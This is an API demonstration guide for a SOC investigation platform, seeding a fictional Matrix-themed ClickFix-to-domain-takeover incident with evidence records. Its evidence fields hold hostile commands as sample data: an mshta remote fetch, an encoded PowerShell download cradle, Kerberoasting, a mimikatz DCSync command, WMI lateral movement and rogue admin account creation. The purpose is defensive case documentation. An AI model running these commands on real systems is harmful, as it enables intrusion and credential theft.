# The Matrix Themed Investigation API Demonstration

This guide provides step-by-step instructions, formatted JSON payloads, cURL commands, and a complete Python automation script demonstrating how to create the **The Matrix** investigation and push all 6 forensic evidence items.

**Key Design Elements:**
- **Zero Database PK Knowledge Required**: API calls reference human-readable identifiers:
  - Customers are referenced by their **Customer ID** string (`CUST-19990`).
  - Investigations are referenced by their **Investigation ID** string in the format **`INV123456`** (`INV000003`).
- **Single-Item Ingestion**: Submitting an individual item via `POST /api/evidence/`.
- **Atomic Bulk Ingestion**: Submitting the remaining 5 items in a single atomic transaction via `POST /api/evidence/bulk_create/`.

---

## 1. Domain Configuration: Production vs Local Development

When targeting a deployed instance on a customer or corporate domain:
- **Production Domain**: The web application and reverse proxy (Nginx / ALB) listen on standard HTTPS (port 443). Nginx automatically proxies `/api/` requests internally to the Django backend.
  - **Base URL**: `https://soc-demo.aircooledcafe.com/api`
  - **Do NOT target port 8000 in production.** Port 8000 is internal to the container network and is not exposed to external clients.
- **Local Development**: When running locally without a reverse proxy or TLS cert:
  - **Base URL**: `http://localhost:8000/api` (direct backend) or `http://localhost:5173/api` (via Vite proxy)

Set your environment variables before running the commands below:
```bash
# Set to your domain (or http://localhost:8000/api for local development)
export API_BASE="https://soc-demo.aircooledcafe.com/api"
export API_TOKEN="YOUR_API_TOKEN_HERE"
```

---

## 2. Prerequisites: API Token Authentication

All requests require an API authentication token passed in the `Authorization` HTTP header:
```http
Authorization: Token <YOUR_API_TOKEN>
```

To obtain your token:
1. Log into the web interface.
2. Click your user avatar / name in the top right → **Account, Avatar & Preferences** → **Password & API Token**.
3. Copy your persistent API token (or click **Regenerate Token** to rotate it).

---

## Step 1: Ensure Target Customer Exists

Register or verify the customer organization using its business **Customer ID** (`CUST-19990`):

```bash
curl -s -X POST "${API_BASE}/customers/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "name": "MetaCortex Software Corporation",
  "customer_id": "CUST-19990",
  "notes": "Enterprise client profile for MetaCortex Software Corporation."
}'
```

*Response returns the customer object with its human-usable `"customer_id": "CUST-19990"`.*

Optionally register escalation contacts on the customer profile via `POST /api/customer-contacts/`:

```bash
curl -s -X POST "${API_BASE}/customer-contacts/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-19990",
  "name": "Thomas Anderson",
  "escalation_tier": "PRIMARY",
  "notes": "Confirmed encountering fake Cloudflare verification prompt while researching API docs."
}'

curl -s -X POST "${API_BASE}/customer-contacts/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-19990",
  "name": "Jason Rhineheart",
  "escalation_tier": "SECONDARY",
  "notes": "Executive sponsor approving emergency forest-wide password & KRBTGT rotation."
}'

```

---

## Step 2: Create the Investigation

Create the root investigation record. Notice that `customer` directly references `"CUST-19990"`—no internal database integer ID is required. You can also specify a custom `investigation_id` in format `INV123456`, or leave it blank to be auto-assigned.

```bash
curl -s -X POST "${API_BASE}/investigations/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-19990",
  "investigation_id": "INV000003",
  "title": "ClickFix Fake Verification Compromise Escalating to Domain Controller Takeover",
  "ticket_id": "SOC-2026-0101",
  "ticket_link": "https://soc.internal.example/tickets/SOC-2026-0101",
  "status": "CONTAINED",
  "lead_analyst": "Trinity",
  "summary": "Developer workstation WKS-NEO-101 (user METACORTEX\\t.anderson) visited a typosquatted documentation site displaying a fraudulent browser '"'"'Human Verification'"'"' ClickFix modal that copied a malicious command to the clipboard and instructed the user to press Win+R, Ctrl+V, and Enter. This executed mshta.exe and an obfuscated PowerShell memory loader establishing C2 to 192.0.2.199 (sentinel-matrix-cdn.net). Within 48 minutes, the threat actor Kerberoasted service account METACORTEX\\svc_zion_sql, cracked the TGS offline, pivoted via SMB/WMI to Tier-0 jump host ADM-NEBUCHADNEZZAR-01, harvested Domain Admin credentials, performed a DCSync replication attack against DC-ARCHITECT-01, and created rogue Enterprise Admin account METACORTEX\\agent_smith.",
  "action_plan": "1. Execute full Active Directory forest recovery procedure: disable `agent_smith`, revoke active Kerberos TGTs, and perform double `krbtgt` reset.\n2. Push GPO blocking `mshta.exe` outbound network traffic and disabling Windows Run dialog (`NoRun`) for standard workstation OUs.\n3. Re-image WKS-NEO-101 and ADM-NEBUCHADNEZZAR-01 after RAM & MFT acquisition.\n4. Confirm with MetaCortex Legal & CISO whether source code repositories on GIT-ZION-01 were accessed after DC takeover.",
  "key_customer_contacts": "MetaCortex Security Operations Bridge: ext. 101 / soc-bridge@metacortex.example",
  "key_assets_affected": "WKS-NEO-101 (10.99.14.101)\nADM-NEBUCHADNEZZAR-01 (10.99.2.15)\nDC-ARCHITECT-01 (10.99.0.10)",
  "key_users_affected": "METACORTEX\\t.anderson\nMETACORTEX\\svc_zion_sql\nMETACORTEX\\adm_morpheus\nMETACORTEX\\agent_smith (Created by Attacker)",
  "key_malicious_indicators": "192.0.2.199\n198.51.100.88\nverify-human-check-docs.com\nsentinel-matrix-cdn.net\nwhite_rabbit.hta\ncypher_beacon.dll"
}'
```

*Response returns the created investigation with its usable ID:*
```json
{
  "investigation_id": "INV000003",
  "customer_id": "CUST-19990",
  "title": "ClickFix Fake Verification Compromise Escalating to Domain Controller Takeover",
  "status": "CONTAINED",
  ...
}
```

Optionally attach related escalated incidents (`POST /api/related-incidents/`) and external research (`POST /api/external-research/`) referencing `"investigation": "INV000003"`:

```bash
curl -s -X POST "${API_BASE}/related-incidents/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "title": "EDR-2026-9901: Explorer.exe RunMRU Spawning mshta.exe & Encoded PowerShell on WKS-NEO-101",
  "link": "https://soc.internal.example/escalations/EDR-2026-9901",
  "analyst_name": "Tank"
}'

curl -s -X POST "${API_BASE}/related-incidents/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "title": "AD-CRIT-2026-0044: Non-DC Directory Replication (DCSync EID 4662) Against DC-ARCHITECT-01",
  "link": "https://soc.internal.example/escalations/AD-CRIT-2026-0044",
  "analyst_name": "Trinity"
}'

curl -s -X POST "${API_BASE}/external-research/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "link": "https://attack.mitre.org/techniques/T1204/004/",
  "summary": "MITRE ATT&CK T1204.004 - User Execution: Malicious Copy and Paste (ClickFix Fake Captcha Lure).",
  "analyst_name": "Trinity"
}'

curl -s -X POST "${API_BASE}/external-research/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "link": "https://attack.mitre.org/techniques/T1003/006/",
  "summary": "MITRE ATT&CK T1003.006 - OS Credential Dumping: DCSync via MS-DRSR GetNCChanges.",
  "analyst_name": "Morpheus"
}'

```

---

## Step 3A: Ingest Single Evidence Item via Individual API Call

Submit Item 1 individually using `POST /api/evidence/`. Notice that `"investigation"` directly references `"INV000003"`:

```bash
curl -s -X POST "${API_BASE}/evidence/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "evidence_type": "ATOMIC",
  "analyst_name": "Tank",
  "timestamp": "2026-10-24T14:05:19Z",
  "summary": "ClickFix execution detected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU recorded mshta.exe payload pasted via Win+R.",
  "affected_asset": "WKS-NEO-101 (10.99.14.101)",
  "affected_user": "METACORTEX\\t.anderson",
  "user_created_by_attacker": false,
  "malicious_hosts_ips": "verify-human-check-docs.com, 198.51.100.88, white_rabbit.hta",
  "commands_run": "mshta.exe https://verify-human-check-docs.com/check/white_rabbit.hta # \"I am not a robot - Verification ID: 8941\"",
  "mitre_tactic": "Initial Access (TA0001); Execution (TA0002); Defense Evasion (TA0005)",
  "mitre_technique": "T1204.004 - User Execution: Malicious Copy and Paste; T1218.005 - System Binary Proxy Execution: Mshta",
  "related_log_link": "https://edr.internal.example/events/neo-runmru-10041",
  "is_key_evidence": true,
  "notes": "Browser history shows visit to verify-human-check-docs.com 11 seconds prior to Run dialog execution."
}'
```

**Response (201 Created):**
```json
{
  "id": 101,
  "investigation_id": "INV000003",
  "evidence_type": "ATOMIC",
  "evidence_type_display": "Atomic Event",
  "analyst_name": "Tank",
  "summary": "ClickFix execution detected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU recorded mshta.exe payload pasted via Win+R.",
  "is_key_evidence": true,
  "created_at": "2026-10-24T14:05:19Z"
}
```

---

## Step 3B: Ingest Remaining 5 Items in Bulk via a Single API Call

Rather than issuing 5 separate HTTP requests, submit the remaining items in a single request to **`POST /api/evidence/bulk_create/`** referencing `"investigation": "INV000003"` (or `POST /api/investigations/INV000003/bulk-evidence/`).

```bash
curl -s -X POST "${API_BASE}/evidence/bulk_create/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000003",
  "items": [
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Trinity",
      "timestamp": "2026-10-24T14:07:02Z",
      "summary": "mshta.exe spawned hidden PowerShell loader injecting cypher_beacon.dll into rundll32.exe and establishing HTTPS C2 to sentinel-matrix-cdn.net.",
      "affected_asset": "WKS-NEO-101 (10.99.14.101)",
      "affected_user": "METACORTEX\\t.anderson",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "192.0.2.199, sentinel-matrix-cdn.net, cypher_beacon.dll",
      "commands_run": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcwBlAG4AdABpAG4AZQBsAC0AbQBhAHQAcgBpAHgALQBjAGQAbgAuAG4AZQB0AC8AcwB0AGEAZwBlADIAIgApAA==",
      "mitre_tactic": "Execution (TA0002); Command and Control (TA0011)",
      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell; T1071.001 - Application Layer Protocol: Web Protocols",
      "related_log_link": "https://edr.internal.example/events/neo-ps-c2-10089",
      "is_key_evidence": false,
      "notes": "Jittered 5-second HTTPS beacon observed to 192.0.2.199:443."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Morpheus",
      "timestamp": "2026-10-24T14:15:00Z",
      "end_timestamp": "2026-10-24T14:18:40Z",
      "summary": "Kerberoasting attack (Event ID 4769 with RC4 0x17 encryption) requested 14 SPN service tickets from WKS-NEO-101, including svc_zion_sql.",
      "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
      "affected_user": "METACORTEX\\t.anderson",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.99.14.101",
      "commands_run": "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName, Hash",
      "mitre_tactic": "Credential Access (TA0006)",
      "mitre_technique": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
      "search_result_link": "https://siem.internal.example/app/discover#/view/kerberoast-eid4769-rc4",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4769%20AND%20TicketEncryptionType:0x17%20AND%20source.ip:10.99.14.101)",
      "is_key_evidence": true,
      "notes": "svc_zion_sql had local admin rights on jump host ADM-NEBUCHADNEZZAR-01 and used a legacy 10-character password."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Trinity",
      "timestamp": "2026-10-24T14:34:11Z",
      "summary": "Lateral movement via WMI Win32_Process Create from WKS-NEO-101 to Tier-0 admin jump host ADM-NEBUCHADNEZZAR-01 using cracked svc_zion_sql credentials.",
      "affected_asset": "ADM-NEBUCHADNEZZAR-01 (10.99.2.15)",
      "affected_user": "METACORTEX\\svc_zion_sql",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.99.14.101, 10.99.2.15, cypher_beacon.dll",
      "commands_run": "wmic /node:10.99.2.15 /user:METACORTEX\\svc_zion_sql process call create \"rundll32.exe C:\\Windows\\Temp\\cypher_beacon.dll,Start\"",
      "mitre_tactic": "Lateral Movement (TA0008); Execution (TA0002)",
      "mitre_technique": "T1047 - Windows Management Instrumentation; T1021.002 - Remote Services: SMB/Windows Admin Shares",
      "related_log_link": "https://edr.internal.example/events/wmiprvse-neb-44102",
      "is_key_evidence": true,
      "notes": "Attacker subsequently stole an active Domain Admin token (METACORTEX\\adm_morpheus) from LSASS on the jump host."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Morpheus",
      "timestamp": "2026-10-24T14:48:05Z",
      "end_timestamp": "2026-10-24T14:50:12Z",
      "summary": "DCSync directory replication (Event ID 4662 DS-Replication-Get-Changes-All) executed from non-DC host ADM-NEBUCHADNEZZAR-01 against DC-ARCHITECT-01.",
      "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
      "affected_user": "METACORTEX\\adm_morpheus",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.99.2.15, 10.99.0.10",
      "commands_run": "lsadump::dcsync /domain:metacortex.local /all /csv",
      "mitre_tactic": "Credential Access (TA0006)",
      "mitre_technique": "T1003.006 - OS Credential Dumping: DCSync",
      "search_result_link": "https://siem.internal.example/app/discover#/view/dcsync-architect-4662",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-ARCHITECT-01%20AND%20event.code:4662%20AND%20Properties:*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*)",
      "is_key_evidence": true,
      "notes": "Full domain password hashes including krbtgt replicated via MS-DRSR protocol — complete Active Directory takeover confirmed."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Trinity",
      "timestamp": "2026-10-24T14:52:33Z",
      "summary": "Rogue account METACORTEX\\agent_smith created on DC-ARCHITECT-01 and added to both Domain Admins and Enterprise Admins (Event IDs 4720, 4728).",
      "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
      "affected_user": "METACORTEX\\agent_smith",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "10.99.0.10",
      "commands_run": "net user agent_smith Inevitable#1999 /add /domain && net group \"Enterprise Admins\" agent_smith /add /domain",
      "mitre_tactic": "Persistence (TA0003); Privilege Escalation (TA0004)",
      "mitre_technique": "T1136.002 - Create Account: Domain Account; T1078.002 - Valid Accounts: Domain Accounts",
      "related_log_link": "https://siem.internal.example/events/dc-eid4720-agent-smith",
      "is_key_evidence": true,
      "notes": "Account disabled during emergency containment at 15:08 UTC alongside host network quarantine."
    }
  ]
}'
```

**Response (201 Created):**
```json
{
  "status": "success",
  "count": 5,
  "items": [
    { "id": 102, "investigation_id": "INV000003", "summary": "mshta.exe spawned hidden PowerShell loader injecting cypher_", ... },
    ...
  ]
}
```

---

## 4. Complete Python Automation Script

This script automatically executes the entire workflow without knowing any database primary keys:
1. Targets your configured domain (or localhost).
2. Connects to Customer `"CUST-19990"` directly and registers escalation contacts.
3. Creates the investigation `"INV000003"` referencing `"CUST-19990"`, along with related incidents and external research links.
4. Posts **Item 1** via the individual single-item endpoint with `"investigation": "INV000003"`.
5. Posts **Items 2–6** in a single call via the **bulk endpoint** with `"investigation": "INV000003"`.
6. Queries `https://soc-demo.aircooledcafe.com/api/investigations/INV000003/` and verifies that all 6 items are in the timeline.

```python
#!/usr/bin/env python3
"""
The Matrix Themed SOC Investigation - Python Automation Script
Demonstrates:
  1. Connecting to customer domain (or local development)
  2. Customer setup & Investigation creation using human-readable IDs ('CUST-19990', 'INV000003')
  3. Escalation contacts, related escalated incidents, and external research creation
  4. Single-item evidence ingestion (Item 1)
  5. High-performance bulk evidence ingestion (Items 2-6)
"""

import os
import sys
import requests

# Base URL: Use your deployed domain or local dev
# In production on soc-demo.aircooledcafe.com, target https://soc-demo.aircooledcafe.com/api (no port 8000)
API_BASE = os.environ.get("API_BASE", "https://soc-demo.aircooledcafe.com/api")
API_TOKEN = os.environ.get("API_TOKEN", "YOUR_API_TOKEN_HERE")

CUSTOMER_CODE = "CUST-19990"
INVESTIGATION_CODE = "INV000003"

headers = {
    "Authorization": f"Token {API_TOKEN}",
    "Content-Type": "application/json",
}

session = requests.Session()
session.headers.update(headers)

print(f"[*] Targeting API at: {API_BASE}")

# 1. Ensure Customer exists using human-readable customer_id
print(f"[*] Creating / verifying Customer '{CUSTOMER_CODE}'...")
customer_payload = {
    "name": "MetaCortex Software Corporation",
    "customer_id": "CUST-19990",
    "notes": "Enterprise client profile for MetaCortex Software Corporation.",
}
cust_res = session.post(f"{API_BASE}/customers/", json=customer_payload)
if cust_res.status_code == 201:
    print(f"[+] Customer created with code: {CUSTOMER_CODE}")
else:
    print(f"[+] Customer '{CUSTOMER_CODE}' already registered and ready for use.")

# 1b. Register Customer Escalation Contacts
contacts_payload = [
    {
        "customer": "CUST-19990",
        "name": "Thomas Anderson",
        "escalation_tier": "PRIMARY",
        "notes": "Confirmed encountering fake Cloudflare verification prompt while researching API docs.",
    },
    {
        "customer": "CUST-19990",
        "name": "Jason Rhineheart",
        "escalation_tier": "SECONDARY",
        "notes": "Executive sponsor approving emergency forest-wide password & KRBTGT rotation.",
    },
]
for contact in contacts_payload:
    c_res = session.post(f"{API_BASE}/customer-contacts/", json=contact)
    if c_res.status_code == 201:
        print(f"[+] Added contact: {contact['name']} ({contact['escalation_tier']})")

# 2. Create Investigation referencing customer by CUSTOMER_CODE
print(f"[*] Creating Investigation '{INVESTIGATION_CODE}'...")
investigation_payload = {
    "customer": "CUST-19990",
    "investigation_id": "INV000003",
    "title": "ClickFix Fake Verification Compromise Escalating to Domain Controller Takeover",
    "ticket_id": "SOC-2026-0101",
    "ticket_link": "https://soc.internal.example/tickets/SOC-2026-0101",
    "status": "CONTAINED",
    "lead_analyst": "Trinity",
    "summary": "Developer workstation WKS-NEO-101 (user METACORTEX\\t.anderson) visited a typosquatted documentation site displaying a fraudulent browser 'Human Verification' ClickFix modal that copied a malicious command to the clipboard and instructed the user to press Win+R, Ctrl+V, and Enter. This executed mshta.exe and an obfuscated PowerShell memory loader establishing C2 to 192.0.2.199 (sentinel-matrix-cdn.net). Within 48 minutes, the threat actor Kerberoasted service account METACORTEX\\svc_zion_sql, cracked the TGS offline, pivoted via SMB/WMI to Tier-0 jump host ADM-NEBUCHADNEZZAR-01, harvested Domain Admin credentials, performed a DCSync replication attack against DC-ARCHITECT-01, and created rogue Enterprise Admin account METACORTEX\\agent_smith.",
    "action_plan": "1. Execute full Active Directory forest recovery procedure: disable `agent_smith`, revoke active Kerberos TGTs, and perform double `krbtgt` reset.\n2. Push GPO blocking `mshta.exe` outbound network traffic and disabling Windows Run dialog (`NoRun`) for standard workstation OUs.\n3. Re-image WKS-NEO-101 and ADM-NEBUCHADNEZZAR-01 after RAM & MFT acquisition.\n4. Confirm with MetaCortex Legal & CISO whether source code repositories on GIT-ZION-01 were accessed after DC takeover.",
    "key_customer_contacts": "MetaCortex Security Operations Bridge: ext. 101 / soc-bridge@metacortex.example",
    "key_assets_affected": "WKS-NEO-101 (10.99.14.101)\nADM-NEBUCHADNEZZAR-01 (10.99.2.15)\nDC-ARCHITECT-01 (10.99.0.10)",
    "key_users_affected": "METACORTEX\\t.anderson\nMETACORTEX\\svc_zion_sql\nMETACORTEX\\adm_morpheus\nMETACORTEX\\agent_smith (Created by Attacker)",
    "key_malicious_indicators": "192.0.2.199\n198.51.100.88\nverify-human-check-docs.com\nsentinel-matrix-cdn.net\nwhite_rabbit.hta\ncypher_beacon.dll",
}
inv_res = session.post(f"{API_BASE}/investigations/", json=investigation_payload)
if inv_res.status_code == 400 and "investigation_id" in inv_res.text:
    # If INVESTIGATION_CODE already exists, allow backend auto-generation of next INV######
    investigation_payload.pop("investigation_id", None)
    inv_res = session.post(f"{API_BASE}/investigations/", json=investigation_payload)
inv_res.raise_for_status()
inv_data = inv_res.json()
inv_id = inv_data.get("investigation_id") or INVESTIGATION_CODE
print(f"[+] Created Investigation '{inv_id}': '{inv_data['title']}'")

# 2b. Attach Related Escalated Incidents
related_incidents = [
    {
        "title": "EDR-2026-9901: Explorer.exe RunMRU Spawning mshta.exe & Encoded PowerShell on WKS-NEO-101",
        "link": "https://soc.internal.example/escalations/EDR-2026-9901",
        "analyst_name": "Tank",
    },
    {
        "title": "AD-CRIT-2026-0044: Non-DC Directory Replication (DCSync EID 4662) Against DC-ARCHITECT-01",
        "link": "https://soc.internal.example/escalations/AD-CRIT-2026-0044",
        "analyst_name": "Trinity",
    },
]
for rel in related_incidents:
    rel_payload = {"investigation": inv_id, **rel}
    r_res = session.post(f"{API_BASE}/related-incidents/", json=rel_payload)
    r_res.raise_for_status()
    print(f"[+] Linked related incident: {rel['title']}")

# 2c. Attach External Research Links
external_research = [
    {
        "link": "https://attack.mitre.org/techniques/T1204/004/",
        "summary": "MITRE ATT&CK T1204.004 - User Execution: Malicious Copy and Paste (ClickFix Fake Captcha Lure).",
        "analyst_name": "Trinity",
    },
    {
        "link": "https://attack.mitre.org/techniques/T1003/006/",
        "summary": "MITRE ATT&CK T1003.006 - OS Credential Dumping: DCSync via MS-DRSR GetNCChanges.",
        "analyst_name": "Morpheus",
    },
]
for res_item in external_research:
    res_payload = {"investigation": inv_id, **res_item}
    er_res = session.post(f"{API_BASE}/external-research/", json=res_payload)
    er_res.raise_for_status()
    print(f"[+] Added research item: {res_item['link']}")

# 3. Ingest Individual Item (Item 1) referencing inv_id
print(f"\n[*] [Single Ingest] Ingesting Item 1 into '{inv_id}' via POST /api/evidence/...")
item_1 = {
    "evidence_type": "ATOMIC",
    "analyst_name": "Tank",
    "timestamp": "2026-10-24T14:05:19Z",
    "summary": "ClickFix execution detected: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU recorded mshta.exe payload pasted via Win+R.",
    "affected_asset": "WKS-NEO-101 (10.99.14.101)",
    "affected_user": "METACORTEX\\t.anderson",
    "user_created_by_attacker": False,
    "malicious_hosts_ips": "verify-human-check-docs.com, 198.51.100.88, white_rabbit.hta",
    "commands_run": "mshta.exe https://verify-human-check-docs.com/check/white_rabbit.hta # \"I am not a robot - Verification ID: 8941\"",
    "mitre_tactic": "Initial Access (TA0001); Execution (TA0002); Defense Evasion (TA0005)",
    "mitre_technique": "T1204.004 - User Execution: Malicious Copy and Paste; T1218.005 - System Binary Proxy Execution: Mshta",
    "related_log_link": "https://edr.internal.example/events/neo-runmru-10041",
    "is_key_evidence": True,
    "notes": "Browser history shows visit to verify-human-check-docs.com 11 seconds prior to Run dialog execution.",
}
item_1["investigation"] = inv_id
res_single = session.post(f"{API_BASE}/evidence/", json=item_1)
res_single.raise_for_status()
print(f"[+] [1/6] Created single item ID: {res_single.json()['id']} on {inv_id}")

# 4. Ingest Remaining 5 Items in Bulk (Items 2-6) referencing inv_id
print(f"\n[*] [Bulk Ingest] Ingesting remaining 5 items into '{inv_id}' via POST /api/evidence/bulk_create/...")
bulk_items = [
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Trinity",
        "timestamp": "2026-10-24T14:07:02Z",
        "summary": "mshta.exe spawned hidden PowerShell loader injecting cypher_beacon.dll into rundll32.exe and establishing HTTPS C2 to sentinel-matrix-cdn.net.",
        "affected_asset": "WKS-NEO-101 (10.99.14.101)",
        "affected_user": "METACORTEX\\t.anderson",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "192.0.2.199, sentinel-matrix-cdn.net, cypher_beacon.dll",
        "commands_run": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcwBlAG4AdABpAG4AZQBsAC0AbQBhAHQAcgBpAHgALQBjAGQAbgAuAG4AZQB0AC8AcwB0AGEAZwBlADIAIgApAA==",
        "mitre_tactic": "Execution (TA0002); Command and Control (TA0011)",
        "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell; T1071.001 - Application Layer Protocol: Web Protocols",
        "related_log_link": "https://edr.internal.example/events/neo-ps-c2-10089",
        "is_key_evidence": False,
        "notes": "Jittered 5-second HTTPS beacon observed to 192.0.2.199:443.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Morpheus",
        "timestamp": "2026-10-24T14:15:00Z",
        "end_timestamp": "2026-10-24T14:18:40Z",
        "summary": "Kerberoasting attack (Event ID 4769 with RC4 0x17 encryption) requested 14 SPN service tickets from WKS-NEO-101, including svc_zion_sql.",
        "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
        "affected_user": "METACORTEX\\t.anderson",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.99.14.101",
        "commands_run": "Invoke-Kerberoast -OutputFormat Hashcat | Select-Object SamAccountName, Hash",
        "mitre_tactic": "Credential Access (TA0006)",
        "mitre_technique": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
        "search_result_link": "https://siem.internal.example/app/discover#/view/kerberoast-eid4769-rc4",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4769%20AND%20TicketEncryptionType:0x17%20AND%20source.ip:10.99.14.101)",
        "is_key_evidence": True,
        "notes": "svc_zion_sql had local admin rights on jump host ADM-NEBUCHADNEZZAR-01 and used a legacy 10-character password.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Trinity",
        "timestamp": "2026-10-24T14:34:11Z",
        "summary": "Lateral movement via WMI Win32_Process Create from WKS-NEO-101 to Tier-0 admin jump host ADM-NEBUCHADNEZZAR-01 using cracked svc_zion_sql credentials.",
        "affected_asset": "ADM-NEBUCHADNEZZAR-01 (10.99.2.15)",
        "affected_user": "METACORTEX\\svc_zion_sql",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.99.14.101, 10.99.2.15, cypher_beacon.dll",
        "commands_run": "wmic /node:10.99.2.15 /user:METACORTEX\\svc_zion_sql process call create \"rundll32.exe C:\\Windows\\Temp\\cypher_beacon.dll,Start\"",
        "mitre_tactic": "Lateral Movement (TA0008); Execution (TA0002)",
        "mitre_technique": "T1047 - Windows Management Instrumentation; T1021.002 - Remote Services: SMB/Windows Admin Shares",
        "related_log_link": "https://edr.internal.example/events/wmiprvse-neb-44102",
        "is_key_evidence": True,
        "notes": "Attacker subsequently stole an active Domain Admin token (METACORTEX\\adm_morpheus) from LSASS on the jump host.",
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Morpheus",
        "timestamp": "2026-10-24T14:48:05Z",
        "end_timestamp": "2026-10-24T14:50:12Z",
        "summary": "DCSync directory replication (Event ID 4662 DS-Replication-Get-Changes-All) executed from non-DC host ADM-NEBUCHADNEZZAR-01 against DC-ARCHITECT-01.",
        "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
        "affected_user": "METACORTEX\\adm_morpheus",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.99.2.15, 10.99.0.10",
        "commands_run": "lsadump::dcsync /domain:metacortex.local /all /csv",
        "mitre_tactic": "Credential Access (TA0006)",
        "mitre_technique": "T1003.006 - OS Credential Dumping: DCSync",
        "search_result_link": "https://siem.internal.example/app/discover#/view/dcsync-architect-4662",
        "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-ARCHITECT-01%20AND%20event.code:4662%20AND%20Properties:*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*)",
        "is_key_evidence": True,
        "notes": "Full domain password hashes including krbtgt replicated via MS-DRSR protocol — complete Active Directory takeover confirmed.",
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Trinity",
        "timestamp": "2026-10-24T14:52:33Z",
        "summary": "Rogue account METACORTEX\\agent_smith created on DC-ARCHITECT-01 and added to both Domain Admins and Enterprise Admins (Event IDs 4720, 4728).",
        "affected_asset": "DC-ARCHITECT-01 (10.99.0.10)",
        "affected_user": "METACORTEX\\agent_smith",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "10.99.0.10",
        "commands_run": "net user agent_smith Inevitable#1999 /add /domain && net group \"Enterprise Admins\" agent_smith /add /domain",
        "mitre_tactic": "Persistence (TA0003); Privilege Escalation (TA0004)",
        "mitre_technique": "T1136.002 - Create Account: Domain Account; T1078.002 - Valid Accounts: Domain Accounts",
        "related_log_link": "https://siem.internal.example/events/dc-eid4720-agent-smith",
        "is_key_evidence": True,
        "notes": "Account disabled during emergency containment at 15:08 UTC alongside host network quarantine.",
    },
]

bulk_payload = {
    "investigation": inv_id,
    "items": bulk_items,
}

res_bulk = session.post(f"{API_BASE}/evidence/bulk_create/", json=bulk_payload)
res_bulk.raise_for_status()
bulk_data = res_bulk.json()
print(f"[+] Bulk ingest completed! Added {bulk_data['count']} items in 1 atomic transaction.")

# 5. Verify Investigation Timeline using human-readable inv_id
print(f"\n[*] Verifying investigation timeline for '{inv_id}'...")
inv_detail = session.get(f"{API_BASE}/investigations/{inv_id}/").json()
total_timeline = len(inv_detail["timeline_events"])
print(f"[+] Total timeline events in Investigation '{inv_id}': {total_timeline}")

if total_timeline == 6:
    print(f"\n✅ Verification SUCCESS: 1 item ingested individually + 5 items ingested in bulk = 6 total items on '{inv_id}'!")
else:
    print(f"\n⚠️ Unexpected event count: expected 6, found {total_timeline}")
```
